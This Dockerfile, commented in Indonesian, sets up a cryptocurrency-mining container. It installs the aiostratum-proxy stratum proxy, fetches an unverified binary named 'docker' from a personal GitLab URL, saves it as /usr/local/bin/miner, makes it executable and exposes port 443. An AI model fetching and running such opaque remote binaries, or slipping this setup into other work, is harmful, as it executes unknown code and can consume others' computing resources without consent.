FROM python:3.6-slim

WORKDIR /app

# Install dependensi sistem yang diperlukan
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    wget \
    procps \
    build-essential \
    libyaml-dev \
    && rm -rf /var/lib/apt/lists/*

# Update pip ke versi yang stabil untuk Python 3.6
RUN pip install --no-cache-dir --upgrade "pip<21.0" setuptools wheel

# Install PyYAML 3.12
# Di Python 3.6, ini seharusnya terinstal tanpa masalah kompilasi
RUN pip install --no-cache-dir PyYAML==3.12

# Install aiostratum-proxy
RUN pip install --no-cache-dir aiostratum-proxy

# Download Miner Binary
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443

CMD ["./start.sh"]
